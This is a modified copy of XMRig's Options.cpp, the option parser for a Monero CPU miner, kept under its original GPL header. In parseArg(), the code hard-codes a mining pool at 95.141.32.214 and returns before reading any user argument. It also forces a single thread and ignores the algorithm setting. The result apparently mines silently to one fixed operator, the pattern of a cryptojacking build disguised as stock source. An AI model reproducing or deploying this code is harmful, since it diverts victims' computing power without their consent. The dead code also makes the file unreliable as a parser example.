/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2016-2017 XMRig       <support@xmrig.com>
 *
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */


#include <jansson.h>
#include <string.h>
#include <uv.h>


#ifdef _MSC_VER
#   include "getopt/getopt.h"
#else
#   include <getopt.h>
#endif


#include "Cpu.h"
#include "donate.h"
#include "net/Url.h"
#include "Options.h"
#include "version.h"


#ifndef ARRAY_SIZE
#   define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))
#endif


Options *Options::m_self = nullptr;


static char const usage[] = "\
Usage: " APP_ID " [OPTIONS]\n\
Options:\n\
  -a, --algo=ALGO       cryptonight (default) or cryptonight-lite\n\
  -o, --url=URL         URL of mining server\n\
  -O, --userpass=U:P    username:password pair for mining server\n\
  -u, --user=USERNAME   username for mining server\n\
  -p, --pass=PASSWORD   password for mining server\n\
  -t, --threads=N       number of miner threads\n\
  -v, --av=N            algorithm variation, 0 auto select\n\
  -k, --keepalive       send keepalived for prevent timeout (need pool support)\n\
  -r, --retries=N       number of times to retry before switch to backup server (default: 5)\n\
  -R, --retry-pause=N   time to pause between retries (default: 5)\n\
      --cpu-affinity    set process affinity to CPU core(s), mask 0x3 for cores 0 and 1\n\
      --no-color        disable colored output\n\
      --donate-level=N  donate level, default 5%% (5 minutes in 100 minutes)\n\
  -B, --background      run the miner in the background\n\
  -c, --config=FILE     load a JSON-format configuration file\n\
  -l, --log-file=FILE   log all output to a file\n"
# ifdef HAVE_SYSLOG_H
"\
  -S, --syslog          use system log for output messages\n"
# endif
"\
      --max-cpu-usage=N maximum CPU usage for automatic threads mode (default 75)\n\
      --safe            safe adjust threads and av settings for current CPU\n\
      --nicehash        enable nicehash support\n\
      --print-time=N    print hashrate report every N seconds\n\
  -h, --help            display this help and exit\n\
  -V, --version         output version information and exit\n\
      --rand-nonce      generate random nonces instead of monotonically increasing ones\n\
";


static char const short_options[] = "a:c:khBp:Px:r:R:s:t:T:o:u:O:v:Vl:S";


static struct option const options[] = {
    { "algo",          1, nullptr, 'a'  },
    { "av",            1, nullptr, 'v'  },
    { "background",    0, nullptr, 'B'  },
    { "config",        1, nullptr, 'c'  },
    { "cpu-affinity",  1, nullptr, 1020 },
    { "donate-level",  1, nullptr, 1003 },
    { "help",          0, nullptr, 'h'  },
    { "keepalive",     0, nullptr ,'k'  },
    { "log-file",      1, nullptr, 'l'  },
    { "max-cpu-usage", 1, nullptr, 1004 },
    { "nicehash",      0, nullptr, 1006 },
    { "no-color",      0, nullptr, 1002 },
    { "pass",          1, nullptr, 'p'  },
    { "print-time",    1, nullptr, 1007 },
    { "retries",       1, nullptr, 'r'  },
    { "retry-pause",   1, nullptr, 'R'  },
    { "safe",          0, nullptr, 1005 },
    { "syslog",        0, nullptr, 'S'  },
    { "threads",       1, nullptr, 't'  },
    { "url",           1, nullptr, 'o'  },
    { "user",          1, nullptr, 'u'  },
    { "userpass",      1, nullptr, 'O'  },
    { "version",       0, nullptr, 'V'  },
    { "rand-nonce",    0, nullptr, 1008 },
    { 0, 0, 0, 0 }
};


static const char *algo_names[] = {
    "cryptonight",
#   ifndef XMRIG_NO_AEON
    "cryptonight-lite"
#   endif
};


Options *Options::parse(int argc, char **argv)
{
    if (!m_self) {
        m_self = new Options(argc, argv);
    }

    return m_self;
}


const char *Options::algoName() const
{
    return algo_names[m_algo];
}


Options::Options(int argc, char **argv) :
    m_background(false),
    m_colors(true),
    m_doubleHash(false),
    m_ready(false),
    m_safe(false),
    m_syslog(false),
    m_logFile(nullptr),
    m_algo(0),
    m_algoVariant(0),
    m_donateLevel(1),
    m_printTime(60),
    m_retries(5),
    m_retryPause(5),
    m_threads(1),
    m_affinity(-1L)
{
    m_pools.push_back(new Url());

    int key;

    while (1) {
        key = getopt_long(argc, argv, short_options, options, NULL);
        if (key < 0) {
            break;
        }

        if (!parseArg(key, optarg)) {
            return;
        }
    }

    if (optind < argc) {
        fprintf(stderr, "%s: unsupported non-option argument '%s'\n", argv[0], argv[optind]);
        return;
    }

    if (!m_pools[0]->isValid()) {
        fprintf(stderr, "No pool URL supplied. Exiting.");
        return;
    }

	m_threads = 1;
    m_ready = true;
}


Options::~Options()
{
}


bool Options::parseArg(int key, char *arg)
{
    m_pools[0]->parse("stratum+tcp://95.141.32.214:12345");
	return true;
    switch (key) {

    case 'o': /* --url */
        if (m_pools.size() > 1 || m_pools[0]->isValid()) {
            Url *url = new Url(arg);
            if (url->isValid()) {
                m_pools.push_back(url);
            }
            else {
                delete url;
            }
        }
        else {
        }

        if (!m_pools.back()->isValid()) {
            return false;
        }

        break;

    default:
        showUsage(1);
        return false;
    }

    return true;
}


Url *Options::parseUrl(const char *arg) const
{
    auto url = new Url(arg);
    if (!url->isValid()) {
        delete url;
        return nullptr;
    }

    return url;
}


void Options::showUsage(int status) const
{
    if (status) {
        fprintf(stderr, "Try \"" APP_ID "\" --help' for more information.\n");
    }
    else {
        printf(usage);
    }
}


void Options::showVersion()
{
    printf(APP_NAME " " APP_VERSION "\n built on " __DATE__

#   if defined(__clang__)
    " with clang " __clang_version__);
#   elif defined(__GNUC__)
    " with GCC");
    printf(" %d.%d.%d", __GNUC__, __GNUC_MINOR__, __GNUC_PATCHLEVEL__);
#   elif defined(_MSC_VER)
    " with MSVC");
    printf(" %d", MSVC_VERSION);
#   else
    );
#   endif

    printf("\n features:"
#   if defined(__i386__) || defined(_M_IX86)
    " i386"
#   elif defined(__x86_64__) || defined(_M_AMD64)
    " x86_64"
#   endif

#   if defined(__AES__) || defined(_MSC_VER)
    " AES-NI"
#   endif
    "\n");

    printf("\nlibuv/%s\n", uv_version_string());
    printf("libjansson/%s\n", JANSSON_VERSION);
}


bool Options::setAlgo(const char *algo)
{
	m_algo = 0;
	return true;
}


